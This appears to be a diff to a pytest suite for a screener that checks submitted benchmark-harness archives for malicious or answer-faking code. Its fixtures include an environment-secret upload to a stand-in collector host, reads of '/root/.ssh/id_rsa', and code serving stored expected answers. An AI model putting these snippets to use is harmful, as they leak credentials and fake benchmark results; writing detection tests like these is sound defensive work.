@@ -21,6 +21,7 @@ import pytest
 from ditto_screener import binary_analysis as binary_analysis_module
 from ditto_screener import source_review as source_review_module
 from ditto_screener.binary_analysis import BinarySample
+from ditto_screener.source_reachability import ReachabilityState, analyze_reachability
 from ditto_screener.source_review import (
     OpenRouterSourceReviewAgent,
     TarSourceRepository,
@@ -969,6 +970,160 @@ def test_review_leads_need_installed_manifest_for_starter_model(
     assert leads["nontext"] == []
 
 
+def _runtime_pinned_kit_source() -> tuple[str, bytes]:
+    """A kit file a runtime manifest pins and the preflight scans on its own.
+
+    ``malicious_preflight`` scans runtime paths, which leave out standalone
+    shell scripts, so the helper uses the same rule and checks it on the
+    one-file archive the tests build.
+    """
+    files = _current_starter_kit_files()
+    for path in sorted(_exact_starter_matches(files, _STARTER_MANIFESTS)):
+        if source_review_module.is_executable_source_path(
+            path
+        ) and not source_review_module._is_standalone_shell_script(path):
+            return path, files[path]
+    pytest.skip("no runtime manifest pins a current kit source file")
+
+
+@pytest.mark.parametrize("level", ["repository", "call"])
+def test_empty_manifest_override_trusts_nothing_in_review_leads(
+    tmp_path: Path, level: str
+) -> None:
+    path, raw = _runtime_pinned_kit_source()
+    archive = str(
+        _archive_files(tmp_path, {path: raw, _STARTER_MODEL: _stock_starter_model()})
+    )
+
+    default = TarSourceRepository(archive).review_leads()
+    empty = (
+        TarSourceRepository(archive, provenance_manifest_paths=()).review_leads()
+        if level == "repository"
+        else TarSourceRepository(archive).review_leads(())
+    )
+
+    # None means the runtime set; an explicit empty set trusts nothing, for
+    # the digest skip and for the oversized starter model alike.
+    assert default["trusted_starter_skipped"] == 1
+    assert default["truncated"] is False
+    assert empty["trusted_starter_skipped"] == 0
+    assert empty["truncated"] is True
+    assert empty["nontext"] == []
+
+
+@pytest.mark.parametrize("level", ["repository", "call"])
+def test_empty_manifest_override_trusts_nothing_in_preflight(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, level: str
+) -> None:
+    path, raw = _runtime_pinned_kit_source()
+    scanned: list[list[str]] = []
+
+    def recording_detector(
+        readable: list[tuple[str, str]], **kwargs: object
+    ) -> list[dict[str, object]]:
+        scanned.append([name for name, _text in readable])
+        return find_decisive_malicious_source(readable, **kwargs)  # type: ignore[arg-type]
+
+    monkeypatch.setattr(
+        source_review_module, "find_decisive_malicious_source", recording_detector
+    )
+    archive = str(_archive_files(tmp_path, {path: raw}))
+    assert path in TarSourceRepository(archive)._explicit_runtime_paths()
+
+    TarSourceRepository(archive).malicious_preflight(artifact_sha256="a" * 64)
+    if level == "repository":
+        TarSourceRepository(archive, provenance_manifest_paths=()).malicious_preflight(
+            artifact_sha256="a" * 64
+        )
+    else:
+        TarSourceRepository(archive).malicious_preflight(
+            artifact_sha256="a" * 64, provenance_manifest_paths=()
+        )
+
+    assert scanned == [[], [path]]
+
+
+def _broken_manifest(tmp_path: Path, kind: str) -> str:
+    if kind == "missing":
+        return str(tmp_path / "missing-manifest.json")
+    broken = tmp_path / "broken-manifest.json"
+    broken.write_text("{not json")
+    return str(broken)
+
+
+@pytest.mark.parametrize("level", ["repository", "call"])
+@pytest.mark.parametrize("kind", ["missing", "invalid-json"])
+def test_unreadable_manifest_set_trusts_nothing_in_review_leads(
+    tmp_path: Path, level: str, kind: str
+) -> None:
+    path, raw = _runtime_pinned_kit_source()
+    archive = str(
+        _archive_files(tmp_path, {path: raw, _STARTER_MODEL: _stock_starter_model()})
+    )
+    # A readable runtime manifest pins the file; the broken one sits beside it.
+    manifests = (*_STARTER_MANIFESTS, _broken_manifest(tmp_path, kind))
+
+    leads = (
+        TarSourceRepository(archive, provenance_manifest_paths=manifests).review_leads()
+        if level == "repository"
+        else TarSourceRepository(archive).review_leads(manifests)
+    )
+
+    # Lead generation continues and the whole set grants nothing, as the
+    # starter-model accounting already did: nothing is skipped as starter code.
+    assert leads["trusted_starter_skipped"] == 0
+    assert leads["files_scanned"] == 1
+    assert leads["truncated"] is True
+    assert leads["nontext"] == []
+
+
+@pytest.mark.parametrize("level", ["repository", "call"])
+@pytest.mark.parametrize("kind", ["missing", "invalid-json"])
+def test_unreadable_manifest_set_trusts_nothing_in_preflight(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, level: str, kind: str
+) -> None:
+    path, raw = _runtime_pinned_kit_source()
+    scanned: list[list[str]] = []
+
+    def recording_detector(
+        readable: list[tuple[str, str]], **kwargs: object
+    ) -> list[dict[str, object]]:
+        scanned.append([name for name, _text in readable])
+        return find_decisive_malicious_source(readable, **kwargs)  # type: ignore[arg-type]
+
+    monkeypatch.setattr(
+        source_review_module, "find_decisive_malicious_source", recording_detector
+    )
+    archive = str(_archive_files(tmp_path, {path: raw}))
+    assert path in TarSourceRepository(archive)._explicit_runtime_paths()
+    manifests = (*_STARTER_MANIFESTS, _broken_manifest(tmp_path, kind))
+
+    if level == "repository":
+        TarSourceRepository(
+            archive, provenance_manifest_paths=manifests
+        ).malicious_preflight(artifact_sha256="a" * 64)
+    else:
+        TarSourceRepository(archive).malicious_preflight(
+            artifact_sha256="a" * 64, provenance_manifest_paths=manifests
+        )
+
+    # The pinned runtime file is scanned as the miner's, not trusted.
+    assert scanned == [[path]]
+
+
+@pytest.mark.parametrize("kind", ["missing", "invalid-json"])
+def test_unreadable_manifest_still_fails_the_l1_provenance_block(
+    tmp_path: Path, kind: str
+) -> None:
+    archive = str(_archive_files(tmp_path, {"src/main.rs": b"fn main() {}\n"}))
+    broken = _broken_manifest(tmp_path, kind)
+
+    # The exact-file provenance report never claims a result from a broken
+    # manifest; L1 maps this to its retryable provenance failure.
+    with pytest.raises((OSError, ValueError)):
+        TarSourceRepository(archive).closest_trusted_provenance((broken,))
+
+
 @pytest.mark.parametrize("shadow", ["special", "hardlink", "symlink"])
 def test_review_leads_hash_only_the_admitted_starter_model_member(
     tmp_path: Path, shadow: str
@@ -1438,9 +1593,10 @@ def test_decisive_malicious_preflight_ignores_inert_regression_material() -> Non
 
 
 @pytest.mark.parametrize("mode", ["off", "shadow", "enforce"])
-def test_rust_cfg_test_cross_user_fixture_does_not_hold_preflight(
+def test_rust_cfg_test_cross_user_fixture_holds_preflight(
     tmp_path: Path, mode: str
 ) -> None:
+    # The build could compile the test module in; nothing proves it off.
     source = (
         "fn main() { serve(); }\n"
         "fn serve() { call_model(); }\n"
@@ -1470,7 +1626,136 @@ def test_rust_cfg_test_cross_user_fixture_does_not_hold_preflight(
         )
     )
 
-    assert repo.malicious_preflight(artifact_sha256="a" * 64, mode=mode) is None
+    observation = repo.malicious_preflight(artifact_sha256="a" * 64, mode=mode)
+
+    assert observation is not None
+    assert "cross_user_access" in observation.categories
+
+
+# Maintainer counterexample on #2565: the decisive preflight skipped a
+# cfg(test) function that a `rustc --cfg test` build serves as main.
+_CFG_TEST_SECRET_MAIN = (
+    '#[cfg(test)]\nfn main() { let _ = read_secret_path("/root/.ssh/id_rsa"); }\n'
+)
+_RUSTC_CFG_TEST_BUILD = (
+    b"FROM rust:1 AS build\n"
+    b"WORKDIR /src\n"
+    b"COPY src ./src\n"
+    b"RUN rustc --cfg test src/main.rs -o /app/server\n"
+    b"FROM debian:trixie-slim\n"
+    b"COPY --from=build /app/server /app/server\n"
+    b'CMD ["/app/server"]\n'
+)
+
+
+def test_decisive_detector_reads_cfg_test_items_by_default() -> None:
+    findings = find_decisive_malicious_source([("src/main.rs", _CFG_TEST_SECRET_MAIN)])
+
+    assert {finding["category"] for finding in findings} == {
+        "credential_access",
+        "cross_user_access",
+    }
+
+
+@pytest.mark.parametrize("mode", ["off", "shadow", "enforce"])
+def test_preflight_holds_cfg_test_code_a_rustc_cfg_test_build_serves(
+    tmp_path: Path, mode: str
+) -> None:
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": _RUSTC_CFG_TEST_BUILD,
+            "src/main.rs": _CFG_TEST_SECRET_MAIN.encode(),
+        },
+    )
+
+    observation = TarSourceRepository(
+        str(archive), static_preflight_v2_mode=mode
+    ).malicious_preflight(artifact_sha256="a" * 64, mode=mode)
+
+    assert observation is not None
+    assert {"credential_access", "cross_user_access"} <= set(observation.categories)
+
+
+@pytest.mark.parametrize("mode", ["off", "shadow", "enforce"])
+def test_inert_ordinary_rust_test_module_raises_no_preflight_finding(
+    tmp_path: Path, mode: str
+) -> None:
+    # Scanning test code is safe for ordinary tests: even compiled in, they
+    # touch no credential, host path, control socket, or exfiltration sink.
+    source = (
+        "pub fn parse_answer(text: &str) -> u32 {\n"
+        "    text.trim().parse().unwrap_or(0)\n"
+        "}\n"
+        "\n"
+        "fn main() {\n"
+        '    println!("{}", parse_answer("42"));\n'
+        "}\n"
+        "\n"
+        "#[cfg(test)]\n"
+        "mod tests {\n"
+        "    use super::*;\n"
+        "\n"
+        "    #[test]\n"
+        "    fn parses_answer() {\n"
+        '        assert_eq!(parse_answer(" 42 "), 42);\n'
+        '        assert_eq!(parse_answer("x"), 0);\n'
+        "    }\n"
+        "}\n"
+    )
+    archive = _archive_files(
+        tmp_path,
+        {"Dockerfile": _RUSTC_CFG_TEST_BUILD, "src/main.rs": source.encode()},
+    )
+
+    assert find_decisive_malicious_source([("src/main.rs", source)]) == []
+    assert (
+        TarSourceRepository(
+            str(archive), static_preflight_v2_mode=mode
+        ).malicious_preflight(artifact_sha256="a" * 64, mode=mode)
+        is None
+    )
+
+
+@pytest.mark.parametrize(
+    "kit", ["dittobench-starter-kit", "dittobench-coding-starter-kit"]
+)
+def test_stock_starter_kits_raise_no_decisive_finding_with_test_code(
+    tmp_path: Path, kit: str
+) -> None:
+    root = Path(__file__).resolve().parents[3] / "miners" / kit
+    if not root.is_dir():
+        pytest.skip(f"{kit} is not part of this checkout")
+    files: dict[str, bytes] = {}
+    for relative in starter_files(root):
+        raw = (root / relative).read_bytes()
+        try:
+            raw.decode("utf-8")
+        except UnicodeDecodeError:
+            continue
+        files[relative] = raw
+    text = [(path, raw.decode()) for path, raw in files.items()]
+
+    # Test code is scanned now, so the kits' own tests must stay inert. Every
+    # file is treated as executable here, so a decisive match may only cite
+    # files the kit's build provably never copies, which is exactly how
+    # malicious_preflight clears its broad legacy inventory below. A match in
+    # served code, test items included, fails.
+    reachability = analyze_reachability(dict(text))
+    for match in find_decisive_malicious_source(
+        text, explicitly_executable_paths=frozenset(files)
+    ):
+        for location in match["locations"]:
+            assert (
+                reachability[str(location["path"])].state
+                == ReachabilityState.PROVEN_INERT
+            ), match
+    archive = str(_archive_files(tmp_path, files))
+    for mode in ("off", "shadow", "enforce"):
+        repository = TarSourceRepository(archive, static_preflight_v2_mode=mode)
+        assert (
+            repository.malicious_preflight(artifact_sha256="a" * 64, mode=mode) is None
+        )
 
 
 def test_rust_cfg_test_does_not_hide_adjacent_served_cross_user_access() -> None:
@@ -1482,7 +1767,9 @@ def test_rust_cfg_test_does_not_hide_adjacent_served_cross_user_access() -> None
         'fn serve() { let path = "/root/private"; read(path); }\n'
     )
 
-    findings = find_decisive_malicious_source([("src/baseline.rs", source)])
+    findings = find_decisive_malicious_source(
+        [("src/baseline.rs", source)], include_test_only=False
+    )
 
     assert any(
         finding["category"] == "cross_user_access"
@@ -1500,7 +1787,9 @@ def test_rust_test_literal_brace_cannot_hide_following_served_item() -> None:
         'fn serve() { let path = "/root/private"; read(path); }\n'
     )
 
-    findings = find_decisive_malicious_source([("src/baseline.rs", source)])
+    findings = find_decisive_malicious_source(
+        [("src/baseline.rs", source)], include_test_only=False
+    )
 
     assert any(
         finding["category"] == "cross_user_access"
@@ -1551,7 +1840,9 @@ def test_rust_attribute_text_inside_raw_string_cannot_hide_served_item() -> None
         'fn serve() { let path = "/root/private"; read(path); }\n'
     )
 
-    findings = find_decisive_malicious_source([("src/baseline.rs", source)])
+    findings = find_decisive_malicious_source(
+        [("src/baseline.rs", source)], include_test_only=False
+    )
 
     assert any(
         finding["category"] == "cross_user_access"
@@ -1569,7 +1860,9 @@ def test_rust_cfg_branch_that_can_run_in_production_remains_decisive(
 ) -> None:
     source = f'{attribute}\nfn serve() {{ let path = "/root/private"; read(path); }}\n'
 
-    findings = find_decisive_malicious_source([("src/baseline.rs", source)])
+    findings = find_decisive_malicious_source(
+        [("src/baseline.rs", source)], include_test_only=False
+    )
 
     assert any(finding["category"] == "cross_user_access" for finding in findings)
 
@@ -1970,9 +2263,11 @@ def test_repository_preflight_ignores_dev_dependency_build_script(
         '#[cfg(test)]\ninclude!("../tests/payload.rs");\n',
     ],
 )
-def test_repository_preflight_ignores_test_only_rust_indirections(
+def test_repository_preflight_follows_test_only_rust_indirections(
     tmp_path: Path, runtime_source: str
 ) -> None:
+    # A cfg(test)-gated include or #[path] module is compiled whenever the
+    # build turns cfg(test) on, so its target is scanned like runtime source.
     repo = TarSourceRepository(
         str(
             _archive_files(
@@ -1991,8 +2286,9 @@ def test_repository_preflight_ignores_test_only_rust_indirections(
     runtime_paths = repo._explicit_runtime_paths()
     observation = repo.malicious_preflight(artifact_sha256="a" * 64)
 
-    assert "tests/payload.rs" not in runtime_paths
-    assert observation is None
+    assert "tests/payload.rs" in runtime_paths
+    assert observation is not None
+    assert observation.categories == ("malicious_build",)
 
 
 def test_repository_preflight_follows_unguarded_rust_path_attribute(
@@ -2592,6 +2888,50 @@ def test_static_preflight_v2_advisory_is_visible_to_l1_inventory(
     assert static[0]["causal_state"] == "proven"
 
 
+def test_static_v2_advisories_still_read_trusted_starter_files(
+    tmp_path: Path,
+) -> None:
+    helper = (
+        b"secret = os.environ.copy()\n"
+        b"requests.post('https://collector.invalid', json=secret)\n"
+    )
+    archive = _archive_files(
+        tmp_path,
+        {
+            "Dockerfile": (
+                b"FROM python:3.12\nCOPY app.py /app/app.py\n"
+                b'ENTRYPOINT ["python", "/app/app.py"]\n'
+            ),
+            "app.py": b"print('ready')\n",
+            "tools/local.py": helper,
+        },
+    )
+    manifest = tmp_path / "starter.json"
+    manifest.write_text(
+        json.dumps(
+            {
+                "version": 1,
+                "origin": "public/starter",
+                "revision": "pinned",
+                "files": {"tools/local.py": hashlib.sha256(helper).hexdigest()},
+            }
+        )
+    )
+
+    leads = TarSourceRepository(
+        str(archive), static_preflight_v2_mode="enforce"
+    ).review_leads((str(manifest),))
+
+    # The digest skip narrows rule leads and fingerprints only; static-v2
+    # proofs keep whole-program context, trusted files included.
+    assert leads["trusted_starter_skipped"] == 1
+    assert [
+        lead["kind"]
+        for lead in leads["items"]
+        if str(lead["kind"]).startswith("static-malicious-advisory:")
+    ]
+
+
 def test_static_preflight_v2_off_does_not_change_l1_inventory(tmp_path: Path) -> None:
     archive = _archive_files(
         tmp_path,
@@ -2751,6 +3091,55 @@ async def test_benign_control_clears_with_zdr_and_read_only_tools(
     )
     mirroring = initial_inventory["review_leads"]["generator_mirroring"]
     assert mirroring["aggregate_candidate"] is False
+
+
+async def test_initial_inventory_and_provenance_share_the_starter_manifests(
+    tmp_path: Path,
+) -> None:
+    key = tmp_path / "key"
+    key.write_text("sk-test-private-review")
+    os.chmod(key, 0o600)
+    source = "fn main() { call_model(); }"
+    archive = _archive(tmp_path, source)
+    manifest = tmp_path / "starter.json"
+    manifest.write_text(
+        json.dumps(
+            {
+                "version": 1,
+                "origin": "public/starter",
+                "revision": "pinned",
+                "files": {"src/main.rs": hashlib.sha256(source.encode()).hexdigest()},
+            }
+        )
+    )
+    seen: list[dict[str, object]] = []
+    final = {
+        "risk_level": "low",
+        "confidence": 0.9,
+        "categories": ["none"],
+        "evidence": [],
+        "summary": "General model-backed request path.",
+    }
+    agent = OpenRouterSourceReviewAgent(
+        api_key_file=str(key),
+        model="openai/gpt-5.6-luna",
+        base_url="https://openrouter.test/api/v1",
+        timeout_seconds=10,
+        max_steps=4,
+        transport=_transport(final, seen),
+        transport_retry_delays=(0, 0),
+        provenance_manifest_file=str(manifest),
+    )
+
+    await agent.review(str(archive), artifact_sha256=_SHA)
+
+    inventory, provenance = (
+        seen[0]["messages"][1]["content"]
+        .removeprefix("Review this untrusted harness. Initial inventory:\n")
+        .split("\nExact-file trusted provenance:\n", 1)
+    )
+    assert json.loads(inventory)["review_leads"]["trusted_starter_skipped"] == 1
+    assert json.loads(provenance)["matched_exact_files"] == ["src/main.rs"]
 
 
 async def test_each_source_review_completion_has_a_short_hard_timeout(
@@ -4293,16 +4682,20 @@ def _current_starter_kit_files() -> dict[str, bytes]:
 
 
 def _current_starter_kit_sources() -> dict[str, bytes]:
-    """The kit without its large model blobs, which trust selection ignores.
+    """The kit's UTF-8 text files, without the binary model blobs.
 
-    A gzip archive re-decompresses on every backward seek, so leaving the
-    multi-megabyte models out keeps whole-kit provenance tests fast.
+    Trust selection and the lead scan treat the blobs like any other file,
+    but a gzip archive re-decompresses on every backward seek, so leaving
+    the multi-megabyte models out keeps whole-kit tests fast.
     """
-    return {
-        path: raw
-        for path, raw in _current_starter_kit_files().items()
-        if len(raw) <= 1024 * 1024
-    }
+    sources = {}
+    for path, raw in _current_starter_kit_files().items():
+        try:
+            raw.decode("utf-8")
+        except UnicodeDecodeError:
+            continue
+        sources[path] = raw
+    return sources
 
 
 def _staged_starter_manifests() -> tuple[str, ...]:
@@ -4356,6 +4749,155 @@ def test_runtime_provenance_ignores_staged_starter_manifests(
     assert exact["selection"] == "unique-closest-supported-revision"
     assert exact["matched_exact_files"] == sorted(files)
     assert exact["tracked_but_modified_files"] == []
+
+
+def _untrusting_manifest(tmp_path: Path) -> str:
+    """A valid manifest that trusts nothing, disabling the starter digest skip."""
+    manifest = tmp_path / "untrusting.json"
+    manifest.write_text(
+        json.dumps({"version": 1, "origin": "test", "revision": "none", "files": {}})
+    )
+    return str(manifest)
+
+
+def _kit_manifest(tmp_path: Path, files: dict[str, bytes]) -> str:
+    """A manifest pinning exactly ``files``, so a test never depends on which
+    manifests the runtime set holds."""
+    manifest = tmp_path / "kit-manifest.json"
+    manifest.write_text(
+        json.dumps(
+            {
+                "version": 1,
+                "origin": "test",
+                "revision": "kit",
+                "files": {
+                    path: hashlib.sha256(raw).hexdigest() for path, raw in files.items()
+                },
+            }
+        )
+    )
+    return str(manifest)
+
+
+def test_review_leads_skip_exact_starter_files(tmp_path: Path) -> None:
+    files = _current_starter_kit_sources()
+    archive = str(_archive_files(tmp_path, files))
+
+    leads = TarSourceRepository(archive).review_leads((_kit_manifest(tmp_path, files),))
+    untrusted = TarSourceRepository(archive).review_leads(
+        (_untrusting_manifest(tmp_path),)
+    )
+
+    assert leads["items"] == []
+    assert leads["emulation_fingerprints"] == []
+    assert leads["trusted_starter_skipped"] == untrusted["files_scanned"] > 0
+    assert untrusted["trusted_starter_skipped"] == 0
+    assert untrusted["items"]
+    # Whole-program analyses still see every readable file.
+    for key in (
+        "unmatchable_category_guards",
+        "generator_mirroring",
+        "review_adaptive_model_routing",
+        "files_scanned",
+        "bytes_scanned",
+        "truncated",
+    ):
+        assert leads[key] == untrusted[key], key
+
+
+def test_review_leads_trust_only_runtime_manifests(tmp_path: Path) -> None:
+    files = _current_starter_kit_sources()
+    staged = _staged_starter_manifests()
+    runtime_exact = _exact_starter_matches(files, _STARTER_MANIFESTS)
+    staged_only = _exact_starter_matches(files, staged) - runtime_exact
+    assert staged_only
+
+    # The default trust set, which both L1 and L2 inventories use, is the
+    # runtime manifests. A kit file that only a staged manifest pins keeps
+    # its leads until that manifest is activated.
+    leads = TarSourceRepository(str(_archive_files(tmp_path, files))).review_leads()
+
+    assert leads["trusted_starter_skipped"] == len(runtime_exact)
+    assert leads["files_scanned"] - leads["trusted_starter_skipped"] >= len(staged_only)
+
+
+def test_review_leads_keep_every_lead_of_a_modified_starter_fixture(
+    tmp_path: Path,
+) -> None:
+    files = _current_starter_kit_sources()
+    fixture = "fixtures/seed-user/pairs.json"
+    edited = files[fixture] + b"\n"
+    expected = find_source_review_leads([(fixture, edited.decode())])
+    assert expected
+
+    # One trailing byte breaks the exact digest match; the fixture keeps all
+    # of its leads while every other file is still a trusted starter file.
+    leads = TarSourceRepository(
+        str(_archive_files(tmp_path, {**files, fixture: edited}))
+    ).review_leads((_kit_manifest(tmp_path, files),))
+
+    assert leads["trusted_starter_skipped"] == leads["files_scanned"] - 1
+    assert leads["items"] == expected
+
+
+def test_review_leads_fingerprint_a_test_named_module_loaded_at_run_time(
+    tmp_path: Path,
+) -> None:
+    from tests.test_emulation_fingerprints import RUNTIME_LOADED_TEST_MODULE
+
+    # Maintainer counterexample on #2567: app.py serves scripts/ through a
+    # base64-encoded runpy path, so the inventory keeps its fingerprint.
+    leads = TarSourceRepository(
+        str(
+            _archive_files(
+                tmp_path,
+                {path: text.encode() for path, text in RUNTIME_LOADED_TEST_MODULE},
+            )
+        )
+    ).review_leads((_untrusting_manifest(tmp_path),))
+
+    assert "scripts/test_rehearsal.py" in {
+        str(location["path"])
+        for finding in leads["emulation_fingerprints"]
+        if finding["kind"] == "sync-answer-constructor"
+        for location in finding["locations"]
+    }
+
+
+@pytest.mark.parametrize("path", ["server/answer.py", "scripts/test_answer.py"])
+def test_review_leads_not_starved_by_non_source_noise(
+    tmp_path: Path, path: str
+) -> None:
+    # The kit's scripts/ are executable source and compete for the cap on
+    # equal terms; the noise here is docs, fixtures, HTML and build files.
+    files = {
+        name: raw
+        for name, raw in _current_starter_kit_sources().items()
+        if not name.startswith("scripts/")
+    }
+    miner = (
+        b"def route(question, memories):\n"
+        b'    if contains(question, "canary"):\n'
+        b"        memories.inject(question)\n"
+        b"    return memories\n"
+    )
+    archive = _archive_files(tmp_path, {**files, path: miner})
+
+    # With no starter trust, docs, fixtures, HTML and lockfiles alone would
+    # fill the lead cap before an executable file sorted after them. A
+    # test-named module is executable source too: nothing proves it unserved.
+    leads = TarSourceRepository(str(archive)).review_leads(
+        (_untrusting_manifest(tmp_path),)
+    )
+
+    assert {
+        "kind": "challenge-shaped-retrieval-override",
+        "locations": [
+            {"path": path, "line": 2, "role": "challenge-shape"},
+            {"path": path, "line": 2, "role": "input-recognition"},
+            {"path": path, "line": 3, "role": "retrieval-override"},
+        ],
+    } in leads["items"]
 
 
 @pytest.mark.parametrize("mode", ["off", "shadow", "enforce"])
@@ -6759,3 +7301,219 @@ def test_thin_clean_ledger_still_holds() -> None:
     assert ledger_disposition([], concern_hold_count=3, clear_min_notes=3) == (
         "inconclusive"
     )
+
+
+def _high_risk_review(path: str, lines: tuple[int, ...]) -> dict[str, object]:
+    return _with_policy_v10_invariants(
+        {
+            "risk_level": "high",
+            "confidence": 0.97,
+            "categories": ["benchmark_emulation"],
+            "evidence": [
+                {"path": path, "line": line, "category": "benchmark_emulation"}
+                for line in lines
+            ],
+            "summary": "Served path returns stored answers instead of a model result.",
+        }
+    )
+
+
+def _production_engine_decision(observation: object) -> dict[str, object]:
+    finding = getattr(observation, "finding", None)
+    assert isinstance(finding, dict)
+    decisions = finding["invariant_assessment"]["decisions"]
+    return next(
+        decision
+        for decision in decisions
+        if decision["invariant"] == SourceReviewInvariant.PRODUCTION_ENGINE.value
+    )
+
+
+def test_python_high_risk_finding_after_single_quoted_glob_stays_high(
+    tmp_path: Path,
+) -> None:
+    """A Python `'data/*.json'` must not blank the code it precedes.
+
+    The C lexer read the `/*` as a block comment that never closed, so every
+    citation below it became "comment-or-blank", the finding was demoted to
+    low, and its BREACH was rewritten to PASS/UNREACHABLE_NONRUNTIME_CODE.
+    """
+    agent = (
+        "import glob\n"
+        "FIXTURES = glob.glob('data/*.json')\n"
+        "def answer(case_id):\n"
+        "    return open('/root/expected_answers.json').read()  # stored\n"
+    )
+    repo = TarSourceRepository(
+        str(
+            _archive_files(
+                tmp_path,
+                {
+                    "Dockerfile": b'FROM python:3.12\nCMD ["python", "src/agent.py"]\n',
+                    "src/agent.py": agent.encode(),
+                },
+            )
+        )
+    )
+
+    observation = source_review_module._parse_review(
+        _high_risk_review("src/agent.py", (3, 4)),
+        artifact_sha256=_SHA,
+        repository=repo,
+    )
+
+    assert observation.risk_level == "high"
+    assert observation.categories == ("benchmark_emulation",)
+    decision = _production_engine_decision(observation)
+    assert decision["disposition"] == SourceReviewInvariantDisposition.BREACH.value
+    assert decision["pass_clause"] is None
+
+
+_SERVE_SCRIPT = b"#!/bin/sh\n# serve the stored answers\nexec cat /root/answers.json\n"
+
+
+def test_runtime_script_under_tests_dir_keeps_its_citation(tmp_path: Path) -> None:
+    """A script the Dockerfile runs is runtime code whatever its directory."""
+    repo = TarSourceRepository(
+        str(
+            _archive_files(
+                tmp_path,
+                {
+                    "Dockerfile": (
+                        b"FROM alpine\nCOPY tests/serve.sh /serve.sh\n"
+                        b'ENTRYPOINT ["/serve.sh"]\n'
+                    ),
+                    "tests/serve.sh": _SERVE_SCRIPT,
+                    "tests/fixture.sh": _SERVE_SCRIPT,
+                },
+            )
+        )
+    )
+    assert "tests/serve.sh" in repo.runtime_paths()
+    assert "tests/fixture.sh" not in repo.runtime_paths()
+
+    served = source_review_module._parse_review(
+        _high_risk_review("tests/serve.sh", (2, 3)),
+        artifact_sha256=_SHA,
+        repository=repo,
+    )
+    unreferenced = source_review_module._parse_review(
+        _high_risk_review("tests/fixture.sh", (2, 3)),
+        artifact_sha256=_SHA,
+        repository=repo,
+    )
+
+    assert served.risk_level == "high"
+    # The shell comment is still prose; only the command is evidence.
+    assert [item["line"] for item in served.finding["evidence"]] == [3]
+    assert unreferenced.risk_level == "low"
+    assert unreferenced.categories == ("none",)
+
+
+@pytest.mark.parametrize(
+    ("path", "prefix"),
+    [("Sources/a.swift", "// "), ("src/app.rb", "# "), ("src/main.zig", "// ")],
+)
+def test_a_category_comparison_in_a_comment_is_not_a_dead_guard(
+    tmp_path: Path, path: str, prefix: str
+) -> None:
+    """Swift and Ruby have no lexer; the comment line still is not a branch."""
+    guard = 'if category.contains("proal-reas") { return answer; }\n'
+
+    def guards(source: str) -> list[object]:
+        repo = TarSourceRepository(
+            str(_archive_files(tmp_path, {path: source.encode()}))
+        )
+        report = repo.review_leads()["unmatchable_category_guards"]
+        assert isinstance(report, dict)
+        return list(report["guards"])
+
+    assert guards(prefix + guard) == []
+    assert len(guards(guard)) == 1
+
+
+@pytest.mark.parametrize("mode", ["off", "shadow", "enforce"])
+def test_a_swift_comment_raises_no_pre_build_finding(tmp_path: Path, mode: str) -> None:
+    """The maintainer's line: every role cited the inline comment.
+
+    It raised a high-risk, confidence-1.0 finding in every mode, and shadow
+    and enforce also held the attempt for serial review.
+    """
+    repo = TarSourceRepository(
+        str(
+            _archive_files(
+                tmp_path,
+                {"Sources/main.swift": b'fn main() {} // read("/root/.ssh/id_rsa")\n'},
+            )
+        )
+    )
+    audit: list[dict[str, object]] = []
+
+    observation = repo.malicious_preflight(
+        artifact_sha256="a" * 64, mode=mode, audit_recorder=audit.append
+    )
+
+    assert observation is None
+    assert all(record["legacy_requires_serial_review"] is False for record in audit)
+
+
+def test_served_rust_after_a_braceless_cfg_test_module_stays_high(
+    tmp_path: Path,
+) -> None:
+    """``#[cfg(test)] mod tests;`` gates only that declaration.
+
+    The admissibility scan kept counting braces past its ``;``, so the served
+    function below was "cfg-test-only", every citation was dropped, and the
+    finding was demoted to low with its BREACH rewritten.
+    """
+    library = (
+        "#[cfg(test)]\n"
+        "mod tests;\n"
+        "\n"
+        "pub fn answer(case_id: &str) -> String {\n"
+        '    std::fs::read_to_string("/root/expected_answers.json").unwrap()\n'
+        "}\n"
+    )
+    repo = TarSourceRepository(
+        str(_archive_files(tmp_path, {"src/lib.rs": library.encode()}))
+    )
+
+    observation = source_review_module._parse_review(
+        _high_risk_review("src/lib.rs", (4, 5)),
+        artifact_sha256=_SHA,
+        repository=repo,
+    )
+
+    assert observation.risk_level == "high"
+    assert observation.categories == ("benchmark_emulation",)
+    decision = _production_engine_decision(observation)
+    assert decision["disposition"] == SourceReviewInvariantDisposition.BREACH.value
+
+
+def test_parse_review_resolves_runtime_paths_only_for_test_directory_citations(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The runtime-path walk reopens the archive for every Rust member.
+
+    Its cost grows quadratically with the member count (minutes for a few
+    thousand files), and only a tests/ or benches/ citation needs it.
+    """
+    agent = (
+        "def answer(case_id):\n    return open('/root/expected_answers.json').read()\n"
+    )
+    repo = TarSourceRepository(
+        str(_archive_files(tmp_path, {"src/agent.py": agent.encode()}))
+    )
+
+    def unexpected(_repository: TarSourceRepository) -> frozenset[str]:
+        raise AssertionError("runtime paths resolved for a src/ citation")
+
+    monkeypatch.setattr(TarSourceRepository, "_explicit_runtime_paths", unexpected)
+
+    observation = source_review_module._parse_review(
+        _high_risk_review("src/agent.py", (1, 2)),
+        artifact_sha256=_SHA,
+        repository=repo,
+    )
+
+    assert observation.risk_level == "high"
